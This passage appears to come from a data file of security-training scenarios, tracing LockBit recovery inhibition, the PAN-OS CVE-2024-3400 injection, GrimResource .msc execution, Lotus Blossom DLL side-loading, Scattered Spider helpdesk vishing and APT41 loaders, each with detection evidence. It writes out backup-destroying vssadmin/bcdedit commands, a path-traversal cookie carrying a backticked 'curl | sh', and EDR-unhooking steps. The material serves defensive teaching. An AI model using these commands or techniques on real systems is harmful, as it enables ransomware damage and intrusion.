        'Imagine an extortionist who plans to put heavy padlocks on every filing cabinet in an office and demand a ransom for the keys. Before clicking a single padlock shut, the first thing they do is walk into the back storage room and shred every photocopy and backup microfilm reel (`vssadmin delete shadows /all /quiet`), so the office manager cannot simply ignore the padlocks and pull out yesterday’s copies.',
      plainSummary:
        'Before a ransomware payload encrypts a single user document on a Windows system, it almost always performs "Inhibit System Recovery" (MITRE ATT&CK T1490). Windows automatically keeps point-in-time backup snapshots of files using the Volume Shadow Copy Service (VSS). If the ransomware left those shadow copies intact, victims could restore their encrypted files in seconds for free. This scenario traces how the ransomware binary (`lb3_payload.exe`, PID 5540) deletes all shadow copies (`vssadmin.exe delete shadows /all /quiet`) and disables recovery boot options (`bcdedit.exe`), and then runs multi-threaded intermittent file encryption across the drive.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Compromised Windows Server / `lb3_payload.exe` PID 5540), trace the shadow-copy deletion inside Node ② (VSS & WMI Subsystem `vssadmin.exe` PID 5812), and follow the high-speed intermittent file encryption on Node ③ (NTFS File System `D:\\Shares\\Finance\\*`) detected by Node ④ (EDR Canary & SIEM).',
      documentedAdvisory: 'CISA StopRansomware Guide · MITRE ATT&CK T1490 & T1486 · Sysmon EventID 1 / 11 · Windows EventID 8222',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1490',
        plainTitle: 'Deleting All Windows Volume Shadow Copies & Disabling Boot Recovery (`vssadmin delete shadows /all /quiet`)',
        storyAnalogy:
          'The extortionist slips into the archive room with an administrator master key, orders the archive clerk (`vssadmin.exe` / `vssvc.exe`) to silently incinerate every backup snapshot on the shelves without asking for confirmation (`/quiet`), and disconnects the emergency recovery switch (`bcdedit recoveryenabled No`).',
        simpleExplanation:
          'Running with Administrator privileges, the LockBit payload (`lb3_payload.exe`, PID 5540) stops database/backup services and spawns `vssadmin.exe delete shadows /all /quiet` (PID 5812) alongside `bcdedit /set {default} recoveryenabled No` to permanently erase every local Volume Shadow Copy snapshot on the disk before encrypting a single file.',
        howItWorksInPractice:
          'Passing `/quiet` suppresses all confirmation prompts and console output while `vssvc.exe` drops the shadow storage diff areas on the NTFS volume. Because this step happens *before* file encryption begins, an EDR rule that kills the parent process (`PID 5540`) upon unauthorized `vssadmin delete shadows` execution stops the ransomware before data loss occurs.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (`lb3_payload.exe` PID 5540) to Node ② (VSS & WMI Subsystem `vssadmin.exe` PID 5812) monitored by Node ④ (EDR Canary & SIEM Sysmon EID 1).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 1 (`vssadmin.exe delete shadows /all /quiet`, ParentImage `lb3_payload.exe`) & Windows Application Log EventID 8222.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1486',
        plainTitle: 'Multi-Threaded Intermittent File Encryption (AES-NI) & Dropping the Ransom Note',
        storyAnalogy:
          'With every backup copy destroyed and the emergency recovery switch disabled, the crew fans out across every floor using high-speed power tools to lock only the frontlatch (first 64 KB) of every filing cabinet in seconds, taping a ransom note (`Restore-My-Files.txt`) onto every desk.',
        simpleExplanation:
          'With recovery paths eliminated, `lb3_payload.exe` (PID 5540) uses Windows I/O Completion Ports and Intermittent Encryption—encrypting only the first 64 KB of each file on `D:\\Shares\\Finance\\*` with hardware-accelerated AES-NI, renaming files to `*.lockbit` (e.g., `Q4_Budget.xlsx.lockbit`), and dropping `Restore-My-Files.txt` in every directory.',
        howItWorksInPractice:
          'Encrypting only the first 64 KB header of each file renders documents, spreadsheets, and archives completely unusable while allowing the ransomware to corrupt tens of thousands of files across network shares in seconds before defenders can manually unplug the server.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ performs high-speed file encryption and drops `Restore-My-Files.txt` on Node ③ (`NTFS File System D:\\Shares\\Finance\\*`) while Node ④ (`EDR Canary & SIEM`) triggers Sysmon EventID 11 containment.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 11 (`FileCreate: D:\\Shares\\Finance\\Restore-My-Files.txt`) & EDR kernel minifilter canary triggers.',
      },
    ],
  },

  'unit42-panos-midnight-eclipse': {
    scenarioId: 'unit42-panos-midnight-eclipse',
    briefing: {
      headline: 'Scenario Briefing: Operation Midnight Eclipse (CVE-2024-3400) — Palo Alto PAN-OS GlobalProtect Zero-Day',
      storyAnalogy:
        'Imagine a hotel front desk where any guest can hand the clerk a luggage tag (`SESSID` cookie). The clerk simply uses the guest’s tag name to create an empty note file in a back-office folder—and once every hour, a night janitor reads every filename in that folder out loud into the building’s master Intercom system (`bash -c`). By writing a file path and a shell command inside the luggage tag itself, the attacker tricks the front desk into planting a booby-trapped filename that the janitor executes with full master-key privileges.',
      plainSummary:
        'Documented by Palo Alto Networks Unit 42 and Volexity (April 2024), CVE-2024-3400 is a critical (CVSS 10.0) unauthenticated command injection vulnerability in the GlobalProtect VPN feature of PAN-OS when device telemetry is enabled. This scenario traces how the attacker combines two distinct bugs: (1) an arbitrary file-creation flaw in the `SESSID` HTTP cookie (`../../../../opt/panlogs/tmp/device_telemetry/minute/...`) and (2) a shell command-injection flaw when the root-privileged `dt_curl` cron job later passes that filename into a backtick-evaluated shell command.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (UTA0218 Attacker Infrastructure), send the crafted `SESSID` cookie to Node ②/③ (PAN-OS GlobalProtect Portal `:443`), watch the file land in `/opt/panlogs/tmp/device_telemetry/minute/` and trigger root execution inside Node ④ (`dt_curl` Telemetry Cron), and trace the `UPSTYLE` Python backdoor implanted in Node ⑤ (Nginx CSS Path) while Node ⑥ (Cortex XSIAM / SIEM) captures the telemetry.',
      documentedAdvisory: 'Palo Alto Networks Unit 42 Operation Midnight Eclipse · Volexity UTA0218 · CVE-2024-3400 · CISA KEV',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1190',
        plainTitle: 'Directory Traversal in the "SESSID" Cookie Creates a File With Backtick Shell Commands',
        storyAnalogy:
          'The intruder walks up to the GlobalProtect VPN check-in window and presents a forged `SESSID` luggage tag that starts with `../../../../`—forcing the session clerk to place an empty file directly inside the root janitor’s "To-Do" folder, with a shell command disguised as the filename itself.',
        simpleExplanation:
          'The attacker sends an unauthenticated HTTPS POST request to `/ssl-vpn/hipreport.esp` on the GlobalProtect VPN portal. Instead of a normal session ID, the `Cookie: SESSID=` header contains `../../../../opt/panlogs/tmp/device_telemetry/minute/aa` followed by backtick-enclosed shell commands (`` `curl ... | sh` ``).',
        howItWorksInPractice:
          'When GlobalProtect processes `hipreport.esp`, its session serializer creates an empty 0-byte session file using the `SESSID` value as the filename without stripping `../` path traversal sequences—allowing the attacker to create an empty file whose *filename itself* is a shell command inside the device telemetry queue directory.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (UTA0218 Attacker) to Node ②/③ (PAN-OS GlobalProtect `/ssl-vpn/hipreport.esp`), and return arrow ⇠#1.2 as the 0-byte file is created in `/opt/panlogs/tmp/device_telemetry/minute/`.',
        detectionAndEvidence:
          'Documented in Unit 42 Advisory CVE-2024-3400: PAN-OS `appweb3` logs showing `Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/` and zero-byte file creation errors.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.004',
        plainTitle: 'The Root Telemetry Cron Job ("dt_curl") Executes the Malicious Filename as Root',
        storyAnalogy:
          'Sixty seconds later, the automated root janitor (`dt_curl`) walks into the telemetry folder to upload files, reads the booby-trapped filename out loud inside a shell command without quotation marks, and accidentally runs the attacker’s script as `root`.',
        simpleExplanation:
          'Once every minute, the PAN-OS device telemetry service (`dt_curl`, running as `root`) iterates through all files in `/opt/panlogs/tmp/device_telemetry/minute/` and passes each filename into an unescaped shell command. When `dt_curl` processes the attacker’s filename, the Linux shell evaluates the backticks `` `...` `` and executes the attacker’s payload with full `root` privileges.',
        howItWorksInPractice:
          'Because theattacker never needed to write content *into* the file—only control its *name*—even a 0-byte file triggers full root remote code execution the next time the telemetry cron job runs.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ shows Node ③ triggering Node ④ (`dt_curl` root cron job evaluating the backtick filename), and ⇠#2.2 spawns `/bin/sh` as `uid=0(root)` to fetch the stage-2 script.',
        detectionAndEvidence:
          'Documented by Unit 42 & Volexity: `/var/log/pan/device_telemetry_send.log` containing shell syntax fragments and unexpected outbound connections initiated by `dt_curl`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1505.003',
        plainTitle: 'Deploying the "UPSTYLE" Python Webshell and Stealing `running-config.xml`',
        storyAnalogy:
          'Now holding the building’s master key, the intruder copies the master blueprint (`running-config.xml`), installs a hidden listener inside the hotel’s public stylesheet file (`bootstrap.min.css`), and sets a timer that wipes the security logs the moment a command finishes.',
        simpleExplanation:
          'With `root` access on the firewall, the attacker extracts the firewall’s master configuration and private keys (`/opt/pancfg/mgmt/saved-configs/running-config.xml`) and installs the documented **UPSTYLE** Python backdoor, which monitors the legitimate webserver stylesheet `/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css` for hidden commands.',
        howItWorksInPractice:
          'Whenever the attacker sends an HTTPS request that triggers a 404 log entry or modifies `bootstrap.min.css`, UPSTYLE executes the embedded command, writes the output into the CSS file so the attacker can read it over normal HTTPS, and then restores the original CSS file and scrubs `/var/log/pan/sslvpn_access.log` 15 seconds later.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ implants UPSTYLE into Node ⑤ (PAN-OS Web Root `bootstrap.min.css` & `running-config.xml`), while Node ⑥ (SIEM / Cortex XDR) flags the CSS modification timestamp and config exfiltration.',
        detectionAndEvidence:
          'Documented in Unit 42 Operation Midnight Eclipse: rogue Python process running `exec(base64.b64decode(...))` and unexpected `mtime` changes on `bootstrap.min.css`.',
      },
    ],
  },

  'elastic-grimresource-msc': {
    scenarioId: 'elastic-grimresource-msc',
    briefing: {
      headline: 'Scenario Briefing: GrimResource (CVE-2024-26229 / MMC Attack) — Code Execution via Crafted .msc Files',
      storyAnalogy:
        'Imagine a company that banned employees from opening `.exe` packages, but still trusts official-looking "Settings Binder" files (`.msc`) opened by the built-in Windows Management Console (`mmc.exe`). The attacker hides a legacy 1990s self-running gadget (`apds.dll` XSS) inside a Settings Binder; when opened, `mmc.exe` automatically runs the hidden script inside its own trusted process.',
      plainSummary:
        'Discovered and documented by Elastic Security Labs (June 2024), "GrimResource" is a technique that achieves arbitrary code execution inside Windows Management Console (`mmc.exe`) when a user opens a specially crafted Microsoft Saved Console (`.msc`) file. As Microsoft blocked macros in Office documents, attackers shifted to `.msc` files. By abusing a cross-site scripting (XSS) flaw in the legacy Windows `apds.dll` library (`res://apds.dll/redirect.html`) together with DotNetToJScript, the attacker runs arbitrary .NET code inside the trusted `mmc.exe` process.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Phishing Delivery of `invoice_audit.msc`), follow user execution on Node ③ (Windows Workstation `mmc.exe`), trace the `apds.dll` DOM XSS and DotNetToJScript memory injection inside Node ④ (`mmc.exe` / `dllhost.exe`), and watch the final C2 connection to Node ⑤ detected by Node ⑥ (Elastic Defend / SIEM).',
      documentedAdvisory: 'Elastic Security Labs "GrimResource" Report (2024) · MITRE ATT&CK T1218.014 / T1055',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1218.014',
        plainTitle: 'Opening a Malicious `.msc` File Triggers the Legacy `apds.dll` Redirect Vulnerability',
        storyAnalogy:
          'The employee double-clicks an administrative binder (`invoice_audit.msc`). Inside the binder’s cover page (`StringTables`), a hidden reference tells the Windows Management Console to open an ancient help-viewer page (`res://apds.dll/redirect.html`) that blindly executes whatever script is written in its target parameter.',
        simpleExplanation:
          'The victim opens a weaponized console file (`invoice_audit.msc`), which Windows automatically launches using the signed system binary `C:\\Windows\\System32\\mmc.exe`. Inside the `.msc` XML structure, the `<StringTables>` section points an embedded HTML view to `res://C:\\Windows\\System32\\apds.dll/redirect.html?target=javascript:eval(...)`.',
        howItWorksInPractice:
          '`apds.dll` (the legacy Microsoft Help Center library present on every Windows installation) contains an embedded HTML resource (`redirect.html`) that passes its `target` parameter directly to `document.location.replace()` without validation—allowing the `.msc` file to execute arbitrary JScript inside `mmc.exe`’s privileged MSHTML context.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ①/② into Node ③ (`mmc.exe` loading `invoice_audit.msc` and `apds.dll`), and return arrow ⇠#1.2 triggering JScript execution inside `mmc.exe`.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: Sysmon EventID 7 showing `mmc.exe` loading both `apds.dll` and `jscript.dll` / `vbscript.dll` while parsing a non-standard `.msc` file.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1059.007',
        plainTitle: 'Using DotNetToJScript to Reconstruct a .NET Loader Inside `mmc.exe` Memory',
        storyAnalogy:
          'Once the legacy script starts running inside `mmc.exe`, it acts like a 3D printer inside the building: it reads an encoded blueprint from the binder and materializes a full .NET loader (`BinaryFormatter.Deserialize`) directly in RAM.',
        simpleExplanation:
          'The JScript triggered by `apds.dll` uses the **DotNetToJScript** technique: it instantiates a .NET `BinaryFormatter` COM object via ActiveX (`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`) and deserializes a Base64-encoded .NET assembly ("GrimLoader") directly inside the memory space of `mmc.exe`.',
        howItWorksInPractice:
          'Bridging from JScript to the .NET Common Language Runtime (CLR) gives the attacker full access to the Win32 API (`VirtualAllocEx`, `WriteProcessMemory`) from inside the trusted `mmc.exe` process without dropping an executable file to disk.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ deserializes the .NET assembly inside Node ④ (`mmc.exe` CLR Runtime `clr.dll` / `mscoree.dll`), and return arrow ⇠#2.2 initializes the in-memory injector.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: `mmc.exe` loading `jscript9.dll` / `jscript.dll` followed immediately by `.NET CLR` (`clr.dll`) and `amsi.dll` in the same process.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1055',
        plainTitle: 'Spawning `dllhost.exe` & Injecting the Cobalt Strike Beacon via DirtyVanity / APC',
        storyAnalogy:
          'Finally, so the employee can close the Settings Binder without killing the malware, the in-memory loader spawns a quiet background helper (`dllhost.exe`) and hands the active C2 radio over to it.',
        simpleExplanation:
          'To move out of `mmc.exe` before the user closes the console window, the .NET loader spawns a sacrificial `C:\\Windows\\System32\\dllhost.exe` process, allocates RWX memory via indirect syscalls, injects the Cobalt Strike payload, and triggers execution so `dllhost.exe` beacons out to the C2 server.',
        howItWorksInPractice:
          'Migrating from `mmc.exe` into `dllhost.exe` ensures the C2 session persists in the background even if the victim immediately closes the Microsoft Management Console window.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ injects from Node ④ (`mmc.exe`) into `dllhost.exe` and connects out to Node ⑤ (C2 Server), while Node ⑥ (Elastic Defend / SIEM) correlates the `.msc` → `apds.dll` → `dllhost.exe` chain.',
        detectionAndEvidence:
          'Documented in Elastic Detection Rule `execution_via_mmc_apds_dll`: `mmc.exe` loading `apds.dll` and spawning or injecting into `dllhost.exe`.',
      },
    ],
  },

  'elastic-lotus-blossom-chrysalis': {
    scenarioId: 'elastic-lotus-blossom-chrysalis',
    briefing: {
      headline: 'Scenario Briefing: Lotus Blossom APT — DLL Side-Loading & "Chrysalis / Sagerunex" Backdoor',
      storyAnalogy:
        'Imagine a celebrity who only travels with their trusted personal assistant (`mpclient.dll`). Windows has a habit of checking the hotel lobby (the current folder) for the assistant before checking the official headquarters (`System32`). The attacker places an imposter wearing a name tag that says `mpclient.dll` right in the lobby next to a genuine, Microsoft-signed security program (`MsMpEng.exe`). When the genuine program starts up, it hires the imposter standing right next to it.',
      plainSummary:
        'Documented by Elastic Security Labs and Cisco Talos, the Lotus Blossom APT group (also known as Billbug / Bronze Elgin) relies heavily on **DLL Side-Loading** (MITRE T1574.002) to run their custom "Chrysalis" / "Sagerunex" backdoor inside enterprise networks. Instead of running an unsigned malware `.exe` that EDR agents would block, the attacker drops a genuine, digitally signed executable (such as an older signed copy of a security or vendor utility) alongside a maliciously crafted DLL with the exact filename the legitimate program imports—tricking the trusted binary into loading and decrypting the APT backdoor in memory.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Initial Perimeter Compromise), trace the staging of the signed host binary and trojanized DLL on Node ③ (Enterprise Server), follow the DLL side-loading and RC4/XOR payload decryption inside Node ④ (Chrysalis In-Memory Backdoor), and observe the HTTPS C2 tunnel to Node ⑤ detected by Node ⑥ (SIEM / Elastic EDR).',
      documentedAdvisory: 'Elastic Security Labs & Cisco Talos Lotus Blossom / Sagerunex Analysis · MITRE ATT&CK T1574.002',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1574.002',
        plainTitle: 'Dropping a Legitimate Signed Binary Alongside a Trojanized Companion DLL',
        storyAnalogy:
          'The intruder drops a 3-piece kit into a quiet folder (`C:\\ProgramData\\Comms\\`): (1) a real, digitally signed executable, (2) a trojanized helper library with the exact name the executable looks for (`mpclient.dll`), and (3) a locked box of encrypted shellcode (`chrysalis.dat`).',
        simpleExplanation:
          'The attacker stages three files inside a writable directory (such as `C:\\ProgramData\\Comms\\`): (1) a legitimate, validly signed executable (`MsMpEng.exe` or a signed vendor tool), (2) a malicious DLL named `mpclient.dll` placed in that same folder, and (3) an encrypted binary blob (`chrysalis.dat`) containing the real backdoor.',
        howItWorksInPractice:
          'Because Windows’ default DLL search order checks the application’s own directory *before* `C:\\Windows\\System32`, launching the signed `.exe` causes the Windows loader (`ntdll!LdrLoadDll`) to automatically load the attacker’s `mpclient.dll` into the trusted process.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (Signed Host Binary) loading Node ④ (Malicious Side-Loaded DLL in `C:\\ProgramData\\Comms\\`), and return arrow ⇠#1.2 executing `DllMain`.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 7 (ImageLoaded): a signed system/vendor executable running from a non-standard directory (`C:\\ProgramData\\`) and loading an unsigned DLL.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'Reading & Decrypting the "chrysalis.dat" Shellcode Blob Purely in RAM',
        storyAnalogy:
          'Once the imposter assistant (`mpclient.dll`) is invited inside the VIP suite, they quietly unlock the third file (`chrysalis.dat`) in memory—so no antivirus scanner looking at the hard drive ever sees the real weapon.',
        simpleExplanation:
          'Once `mpclient.dll` is loaded inside the signed process, its exported function reads the companion encrypted data file (`chrysalis.dat`) from disk, decrypts it in memory using a custom XOR/RC4 key, and copies the resulting position-independent shellcode into an executable memory buffer.',
        howItWorksInPractice:
          'Splitting the attack into a signed `.exe`, a tiny loader `.dll`, and an encrypted data file (`.dat`) means the actual Chrysalis/Sagerunex backdoor code never exists in unencrypted form on the hard drive.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ inside Node ④ reads and decrypts `chrysalis.dat` into a `VirtualAlloc` buffer, and ⇠#2.2 transfers execution to the unpacked Sagerunex implant.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs: private executable memory allocation (`VirtualAlloc` RW → RX) inside a side-loaded process immediately after reading a local `.dat` / `.bin` file.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.001',
        plainTitle: 'Establishing Persistence & Beaconing Over HTTPS Using Corporate Proxy Credentials',
        storyAnalogy:
          'Wearing the trusted program’s badge, the decrypted backdoor reads the employee’s own internet proxy pass from Windows (`WinInet`) and blends its outbound HTTPS messages right into normal office web traffic.',
        simpleExplanation:
          'Running inside the trusted host binary, the Chrysalis/Sagerunex implant registers persistence via a Windows service or registry Run key and uses `WinInet` APIs (`InternetOpenW` / `HttpSendRequestW`) to automatically reuse the logged-in user’s corporate proxy configuration for outbound HTTPS C2 traffic.',
        howItWorksInPractice:
          'By calling high-level Windows `WinInet` functions instead of raw sockets, the backdoor automatically authenticates through enterprise HTTP proxies using the host’s cached credentials.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ (Chrysalis Backdoor) out to Node ⑤ (Lotus Blossom HTTPS C2) while Node ⑥ (SIEM) correlates the side-loaded DLL with the outbound beacon.',
        detectionAndEvidence:
          'Documented in Elastic & Talos advisories: Sysmon EventID 3 outbound HTTPS connection from a binary executing out of `C:\\ProgramData\\` with an unsigned side-loaded module.',
      },
    ],
  },

  'unit42-scattered-spider-cloud': {
    scenarioId: 'unit42-scattered-spider-cloud',
    briefing: {
      headline: 'Scenario Briefing: Scattered Spider (Muddled Libra) — Helpdesk Social Engineering to Cloud Identity Takeover',
      storyAnalogy:
        'Instead of picking the reinforced digital lock on the front door, the intruder calls the building’s IT Helpdesk pretending to be an employee who just bought a new phone, convinces the clerk to register the intruder’s own smartphone as the employee’s MFA badge, walks right into the IT Lobby (SSO Dashboard), and plugs a private tunnel cable (`ngrok` / Tailscale) directly into the cloud control room.',
      plainSummary:
        'Documented by CISA Advisory AA23-320A and Palo Alto Networks Unit 42 ("Muddled Libra" / Scattered Spider, UNC3944), this scenario shows how modern identity-focused attackers bypass perimeter firewalls altogether. Instead of exploiting a software bug, the attacker calls the company’s IT Helpdesk pretending to be a real employee, convinces the helpdesk agent to reset Multi-Factor Authentication (MFA) and enroll the attacker’s own phone, logs into the corporate Single Sign-On (Okta / Entra ID) portal, deploys a legitimate remote-access tool (FleetDeck / ngrok / Tailscale) for persistence, and pivots into AWS/Azure cloud infrastructure.',
      diagramTopologySummary:
        'On the diagram: Start at Node ① (Scattered Spider Operator), target Node ②/③ (IT Helpdesk & Corporate IdP / SSO Portal) to enroll a rogue MFA device, pivot into Node ④ (VDI / Intune Workstation & RMM Tunnel), and escalate privileges inside Node ⑤ (AWS / Azure Cloud Control Plane), monitored by Node ⑥ (Cloud SIEM / Identity Logs).',
      documentedAdvisory: 'CISA Alert AA23-320A (Scattered Spider) · Unit 42 Muddled Libra Profile · MITRE ATT&CK T1556 / T1078.004',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1556',
        plainTitle: 'Helpdesk Social Engineering ("Vishing") to Register a Rogue MFA Device',
        storyAnalogy:
          'Armed with the employee’s badge number and birthday, the caller rings the IT Helpdesk ("Hi, I got a new iPhone and lost my authenticator app") and persuades the helpdesk clerk to pair the caller’s own phone to the employee’s corporate account.',
        simpleExplanation:
          'Having gathered an employee’s personal details (employee ID, date of birth, manager name), the attacker calls or messages the IT Helpdesk impersonating that employee, claims they bought a new phone, and convinces the helpdesk administrator to issue an MFA reset and register the attacker’s own FIDO2/TOTP authenticator device (`mfa.factor.activate`).',
        howItWorksInPractice:
          'Once the attacker’s own authenticator app is enrolled on the victim’s corporate Identity Provider (Okta / Microsoft Entra ID) account, the attacker can satisfy MFA prompts cleanly without needing to phish or steal session cookies.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ① (Scattered Spider Operator) to Node ②/③ (IT Helpdesk & SSO Identity Provider), and return arrow ⇠#1.2 issuing the new MFA enrollment and SAML/OIDC session token.',
        detectionAndEvidence:
          'Documented in CISA AA23-320A & Okta System Log: `user.mfa.factor.deactivate` / `user.mfa.factor.activate` followed immediately by login (`user.session.start`) from a residential VPN/proxy ASN.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1219',
        plainTitle: 'Logging Into the SSO Dashboard & Deploying Commercial RMM / Tunneling Tools',
        storyAnalogy:
          'Inside the employee’s virtual office, the intruder installs a genuine, IT-approved remote support tool (`AnyDesk` / `Tailscale`) so even if the front-door password is changed tomorrow, they still have a private side door straight into the machine.',
        simpleExplanation:
          'Using the newly hijacked SSO account, the attacker logs into the company’s virtual desktop (VDI) and internal IT documentation (Confluence/SharePoint), and installs legitimate Remote Monitoring and Management (RMM) or tunneling utilities (`AnyDesk`, `ScreenConnect`, `Tailscale`, or `ngrok`) so they keep persistent access even if the user’s password is later reset.',
        howItWorksInPractice:
          'Because commercial RMM tools are digitally signed by legitimate software vendors, they rarely trigger traditional antivirus signatures and allow full interactive desktop control over outbound HTTPS.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ authenticates from Node ③ (SSO Portal) into Node ④ (Corporate VDI / Endpoint) and establishes the RMM tunnel (`⇠#2.2`).',
        detectionAndEvidence:
          'Documented in CISA AA23-320A: Sysmon EventID 1 / 22 showing installation of unauthorized RMM binaries (`AnyDesk.exe`, `ScreenConnect`, `tailscaled`) and DNS queries to `*.ngrok.io` or `*.tailscale.com`.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1078.004',
        plainTitle: 'Federation / Cloud Control-Plane Takeover & AWS STS Token Harvesting',
        storyAnalogy:
          'From the IT dashboard, the intruder attaches a second "Ghost Identity Provider" to the company’s cloud account—allowing them to mint temporary cloud master keys (`AssumeRole`) on demand and export customer databases from S3.',
        simpleExplanation:
          'Searching internal IT wikis and Slack/Teams channels for cloud credentials, the attacker pivots into the AWS / Azure management console, registers a rogue federated Identity Provider or assumes privileged IAM roles (`sts:AssumeRole`), and exfiltrates S3 buckets and EC2 snapshots.',
        howItWorksInPractice:
          'By compromising the Single Sign-On (SSO) layer that governs cloud role federation, the attacker moves laterally from a helpdesk call directly into production cloud infrastructure without touching a single on-premises firewall exploit.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ pivots from Node ④ into Node ⑤ (AWS / Azure Cloud Control Plane via `sts:AssumeRole`), while Node ⑥ (CloudTrail / SIEM) alerts on IAM federation changes.',
        detectionAndEvidence:
          'Documented in AWS CloudTrail & Microsoft Entra Audit Logs: `CreateSAMLProvider`, `UpdateAssumeRolePolicy`, or anomalous `AssumeRole` calls from non-corporate IPs.',
      },
    ],
  },

  'elastic-apt41-dustpan-stealthvector': {
    scenarioId: 'elastic-apt41-dustpan-stealthvector',
    briefing: {
      headline: 'Scenario Briefing: APT41 (Earth Freybug) — DUSTPAN Dropper & STEALTHVECTOR / DUSTTRAP Multi-Stage Chain',
      storyAnalogy:
        'Imagine a Russian nesting doll of disguises: first, a trusted Windows system utility (`wermgr.exe`) is woken up; inside it sits a hollow launcher (**DUSTPAN**), which unpacks an encrypted memory-only command center (**STEALTHVECTOR**), which in turn unlocks a modular toolkit (**DUSTTRAP**) that talks directly to the Windows kernel (`ntdll.dll`) so user-mode security cameras never see it.',
      plainSummary:
        'Documented by Google Mandiant and Elastic Security Labs, this scenario examines the multi-stage memory-only loader chain used by APT41: **DUSTPAN**, **STEALTHVECTOR**, and **DUSTTRAP**. Rather than putting their full backdoor in a single file that analysts could easily reverse-engineer, APT41 uses a chain of hollow loaders: a legitimate Windows process (`wermgr.exe`) is spawned and injected with the DUSTPAN launcher, which decrypts the STEALTHVECTOR orchestrator in memory, which in turn loads the modular DUSTTRAP plugin framework using direct `ntdll` system calls to evade user-mode EDR hooks.',
      diagramTopologySummary:
        'On the diagram: Start at Node ①/② (Scheduled Task / Service Trigger), follow the hollowing of `wermgr.exe` on Node ③ (Enterprise Server), trace the in-memory decryption of DUSTPAN → STEALTHVECTOR → DUSTTRAP inside Node ④ (Multi-Stage Memory Pipeline), and follow the encrypted C2 channel to Node ⑤ monitored by Node ⑥ (SIEM / Elastic EDR).',
      documentedAdvisory: 'Mandiant & Elastic Security Labs APT41 DUSTPAN / DUSTTRAP Analysis · MITRE ATT&CK T1055 / T1140',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1055',
        plainTitle: 'DUSTPAN Launcher Injects Into Windows Error Reporting (`wermgr.exe`)',
        storyAnalogy:
          'The outer nesting doll opens: the dropper starts the official Windows Error Reporting manager (`wermgr.exe`) and slips the **DUSTPAN** stage-1 loader into its memory.',
        simpleExplanation:
          'The initial persistence trigger executes the **DUSTPAN** loader, which immediately spawns a legitimate Windows Error Reporting process (`C:\\Windows\\System32\\wermgr.exe`) and injects its first-stage decryption stub into `wermgr.exe`’s memory space.',
        howItWorksInPractice:
          '`wermgr.exe` runs frequently on Windows systems to report crash telemetry over HTTPS, making it an attractive disguise for malware that needs to make outbound network connections.',
        diagramAlignment:
          'On the diagram, follow arrow #1.1→ from Node ③ (DUSTPAN Dropper) injecting into Node ④ (`wermgr.exe` Process Memory), and return arrow ⇠#1.2 confirming the in-memory stub is active.',
        detectionAndEvidence:
          'Documented in Sysmon EventID 8 / 10: remote thread or APC injection targeting `C:\\Windows\\System32\\wermgr.exe` from a non-system parent process.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1140',
        plainTitle: 'STEALTHVECTOR Unhooking `ntdll.dll` & Decrypting the Modular DUSTTRAP Payload',
        storyAnalogy:
          'Before opening the inner nesting doll (**DUSTTRAP**), the **STEALTHVECTOR** stage brings in a fresh, un-bugged copy of the Windows system phonebook (`ntdll.dll`) from disk—wiping out all the wiretaps that the endpoint’s EDR security agent had placed on the phone lines.',
        simpleExplanation:
          'Running inside `wermgr.exe`, the **STEALTHVECTOR** stage maps a clean copy of `C:\\Windows\\System32\\ntdll.dll` from disk over the `.text` section of the already-loaded `ntdll.dll` in memory—wiping out any inline API hooks placed by user-mode EDR agents—and then ChaCha20-decrypts the **DUSTTRAP** multi-plugin backdoor.',
        howItWorksInPractice:
          'Many user-mode EDR sensors monitor Windows APIs by placing 5-byte `JMP` hooks at the start of functions inside `ntdll.dll`. Overwriting `ntdll.dll`’s `.text` section with the clean bytes from disk removes those hooks so subsequent API calls go unnoticed by user-mode hooks.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ inside Node ④ unhooks `ntdll.dll` and decrypts DUSTTRAP in RAM, and ⇠#2.2 initializes the 16-plugin dispatch table.',
        detectionAndEvidence:
          'Documented by Elastic Security Labs & Mandiant: `VirtualProtect` on `ntdll.dll` `.text` section (RX → RWX → RX) inside `wermgr.exe` followed by unbacked PE execution.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.001',
        plainTitle: 'Loading DUSTTRAP Plugins in Memory & Beaconing Over Custom TLS',
        storyAnalogy:
